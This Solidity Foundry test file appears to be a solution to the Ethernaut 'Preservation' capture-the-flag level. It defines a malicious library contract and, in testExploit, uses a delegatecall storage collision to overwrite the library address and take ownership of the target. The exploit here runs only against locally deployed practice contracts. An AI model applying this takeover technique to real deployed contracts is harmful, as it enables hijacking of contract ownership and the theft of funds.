// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

contract EvilLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    EvilLibrary public evil;
    address public attacker;

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
        evil = new EvilLibrary();
        attacker = makeAddr("attacker");
    }

    function testExploit() public {
        // 1. Begin attack as Attacker
        vm.startPrank(attacker);

        // 2. Tells Preservation to delagatecall into LibraryContract.setTime
        preservation.setFirstTime(uint256(uint160(address(evil))));
        preservation.setFirstTime(uint256(uint160(address(attacker))));

        // 3. Stop prank attack
        vm.stopPrank();

        // 4. Check if takeover worked
        assertEq(preservation.owner(), attacker);
    }
}
